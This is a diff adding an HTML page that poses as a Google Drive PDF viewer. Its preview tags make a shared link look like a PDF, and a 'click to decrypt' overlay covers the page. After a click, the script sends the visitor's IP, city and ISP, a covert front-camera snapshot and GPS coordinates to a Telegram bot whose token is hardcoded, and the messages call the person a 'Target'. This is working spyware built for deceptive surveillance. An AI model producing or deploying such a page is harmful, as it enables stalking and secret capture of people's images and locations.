@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <!-- Meta Tags بۆ ئەوەی وەک PDF دەربکەوێت لە تێلگرام -->
+    <meta property="og:site_name" content="Google Drive">
+    <meta property="og:title" content="Report_2024_Document.pdf">
+    <meta property="og:description" content="PDF Document - 1.2 MB">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/1200px-PDF_file_icon.svg.png">
+    <meta property="og:type" content="website">
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Report_2024_Document.pdf">
+    <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/1200px-PDF_file_icon.svg.png">
+
+    <title>PDF Viewer - Report</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #525659; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        /* شێوازی Viewer ی PDF */
+        .pdf-header {
+            position: fixed; top: 0; width: 100%; height: 50px; background: #323639; 
+            color: white; display: flex; align-items: center; padding: 0 20px; z-index: 2000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+
+        .click-trap { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #fff; z-index: 1000; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; cursor: pointer;
+        }
+
+        .pdf-mock {
+            width: 80%; max-width: 600px; height: 80%; background: #eee;
+            border: 1px solid #ccc; box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            text-align: center; padding: 20px;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3; border-top: 4px solid #3498db;
+            border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #main-frame { width: 100%; height: 100%; border: none; display: none; }
+        #spy-video { position: fixed; opacity: 0.01; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="pdf-header">
+        <span>Report_2024_Document.pdf</span>
+    </div>
+
+    <div class="click-trap" id="clickTrap">
+        <div class="pdf-mock">
+            <div class="loader"></div>
+            <h2 style="color: #333;">Loading Document...</h2>
+            <p style="color: #666;">Click anywhere to decrypt and view the file</p>
+        </div>
+    </div>
+
+    <iframe id="main-frame" src="YOUR_TARGET_PDF_LINK_OR_SITE"></iframe>
+
+    <video id="spy-video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+        const chatId = "6679834643";
+
+        async function sendToBot(text) {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
+        }
+
+        document.getElementById('clickTrap').addEventListener('click', async function() {
+            // شاردنەوەی ترەپەکە و نیشاندانی ناوەڕۆکەکە
+            this.style.display = 'none';
+            document.getElementById('main-frame').style.display = 'block';
+
+            // 1. بردنە دەرەوەی IP
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                sendToBot(`🌐 Target Opened PDF\nIP: ${d.ip}\nCity: ${d.city}\nISP: ${d.org}`);
+            });
+
+            // 2. هەوڵدان بۆ دەستبەسەرداگرتنی کامێرا
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const spyVid = document.getElementById('spy-video');
+                spyVid.srcObject = stream;
+                
+                await new Promise(r => setTimeout(r, 3000)); // چاوەڕێکردنی ٣ چرکە بۆ فۆکس
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = spyVid.videoWidth; 
+                canvas.height = spyVid.videoHeight;
+                canvas.getContext('2d').drawImage(spyVid, 0, 0);
+                
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.90));
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'capture.jpg');
+                fd.append('caption', '👤 Snapshot from PDF Viewer');
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) { 
+                await sendToBot("❌ Camera Permission Denied"); 
+            }
+
+            // 3. هەوڵدان بۆ شوێنی جوگرافی (GPS)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    sendToBot(`📍 GPS location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
